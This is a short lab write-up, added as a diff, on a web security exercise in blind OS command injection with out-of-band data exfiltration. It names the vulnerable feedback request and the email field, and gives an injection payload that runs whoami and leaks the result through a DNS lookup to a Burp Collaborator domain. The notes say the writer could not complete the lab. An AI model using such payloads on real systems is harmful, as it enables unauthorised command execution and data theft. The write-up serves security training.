@@ -1,0 +1,16 @@
+Lab: Blind OS command injection with out-of-band data exfiltration
+
+This lab contains a blind OS command injection vulnerability in the feedback function.
+
+The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
+
+
+
+Vulnerable query: csrf=L1hF9cfaMKRR4GKQiV0KBaQTdc0U0J9C&name=test&email=test%40test.test&subject=test&message=test
+
+Injection in the value for "email" field.
+Payload: & nslookup 'whoami'.test.burpcollaborator.net #
+
+Cannot complete because cannot retrieve the output for the whoami command... burpcollaborator works only with burpsuite pro.
